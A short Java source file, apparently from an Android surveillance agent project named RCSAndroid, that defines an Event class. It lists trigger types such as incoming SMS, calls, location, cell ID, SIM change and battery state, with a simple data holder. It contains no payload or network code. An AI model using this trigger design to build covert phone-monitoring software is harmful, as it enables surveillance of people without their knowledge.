/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.agent.Agent;

public class Event {
	/**
	 * Events definitions
	 */
	final public static int EVENT				= 0x2000;
	final public static int EVENT_TIMER       = EVENT + 0x1; // Timer Event
	final public static int EVENT_SMS         = EVENT + 0x2; // On Sms Event
	final public static int EVENT_CALL        = EVENT + 0x3; // On Call Event
	final public static int EVENT_CONNECTION  = EVENT + 0x4; // On Connectivity Event
	final public static int EVENT_PROCESS     = EVENT + 0x5; // On Process Event
	final public static int EVENT_CELLID      = EVENT + 0x6; // On CellID Event
	final public static int EVENT_QUOTA       = EVENT + 0x7; // On Disk Quota Event
	final public static int EVENT_SIM_CHANGE  = EVENT + 0x8; // On Sim Change Event
	final public static int EVENT_LOCATION    = EVENT + 0x9; // On Position Event
	final public static int EVENT_AC          = EVENT + 0xA; // On AC (power charger) Event
	final public static int EVENT_BATTERY     = EVENT + 0xB; // On Battery Level Event
	final public static int EVENT_STANDBY     = EVENT + 0xC; // On Standby Event

	/**
	 * Events status
	 */
	final public static int EVENT_STOPPED     = Agent.AGENT_STOPPED;
	final public static int EVENT_RUNNING     = Agent.AGENT_RUNNING;
	
	/**
	 * Event type
	 */
	private int eventType;

	/**
	 * Event unique ID
	 */
	private int eventId;

	/**
	 * Event status: enabled, disabled, running, stopped
	 */
	private int eventAction;

	/**
	 * Parameters
	 */
	private byte[] eventParams;

	public Event(int type, int id, int action, byte[] params) {
		this.eventType = type;
		this.eventId = id;
		this.eventAction = action;
		this.eventParams = params;
	}

	public int getType() {
		return this.eventType;
	}

	public int getId() {
		return this.eventId;
	}

	public int getAction() {
		return this.eventAction;
	}

	public byte[] getParams() {
		return this.eventParams;
	}
}
